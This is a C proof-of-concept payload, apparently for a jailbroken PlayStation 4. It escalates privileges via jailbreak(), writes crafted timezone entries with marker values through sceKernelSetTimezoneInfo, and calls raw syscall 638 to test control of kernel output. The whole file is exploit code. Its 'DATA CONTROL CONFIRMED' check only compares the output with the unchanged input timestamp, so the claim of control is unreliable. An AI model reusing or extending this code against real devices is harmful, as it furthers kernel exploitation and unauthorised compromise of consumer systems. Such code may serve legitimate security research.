#include "ps4.h"

#define SYS_UTC_TO_LOCALTIME 638

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initNetwork();
    jailbreak();
    initSysUtil();

    printf_debug("=== timezone PoC ===\n");

    static uint8_t data[2 * 16];
    memset(data, 0, sizeof(data));

    // entry[0]
    *(long*)(data + 0)  = 0x0;
    *(int*)(data  + 8)  = 0x41414141;
    *(int*)(data  + 12) = 0x42424242;

    // entry[1]
    *(long*)(data + 16) = 0x7FFFFFFF;
    *(int*)(data  + 24) = 0x43434343;
    *(int*)(data  + 28) = 0x44444444;

    // استدعاء مباشر عبر libkernel
    int r = sceKernelSetTimezoneInfo(data, 2);
    printf_debug("set_timezone r=%d\n", r);

    if (r != 0) {
        printf_debug("[-] failed\n");
        return 0;
    }

    printf_debug("[+] timezone set!\n");

    // الآن اقرأ النتيجة
    long result  = 0;
    int  dst_out = 0;

    struct {
        long  timestamp;
        long* out_time;
        void* out_info;
        int*  out_dst;
    } utc_args = {
        .timestamp = 0x1000,
        .out_time  = &result,
        .out_info  = NULL,
        .out_dst   = &dst_out,
    };

    int r2 = syscall(SYS_UTC_TO_LOCALTIME, &utc_args);
    printf_debug("utc r=%d\n",     r2);
    printf_debug("result=0x%lx\n", result);

    long expected = 0x1000 ;
    if (result == expected) {
        printf_debug("[+] DATA CONTROL CONFIRMED!\n");
    } else {
        printf_debug("expected=0x%lx\n", expected);
    }

    return 0;
}